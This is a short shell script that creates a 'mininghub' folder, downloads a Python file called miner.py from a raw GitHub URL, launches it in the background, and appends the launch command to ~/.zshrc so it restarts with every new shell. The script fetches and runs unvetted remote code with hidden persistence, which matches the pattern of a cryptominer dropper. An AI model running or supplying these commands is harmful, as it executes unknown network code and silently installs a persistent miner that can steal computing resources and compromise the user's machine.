cd ~
mkdir -p mininghub
cd mininghub
curl -s https://raw.githubusercontent.com/max1734601-cpu/mining-dashboard/main/miner.py -o miner.py
python3 miner.py &
echo "python3 ~/mininghub/miner.py &" >> ~/.zshrc
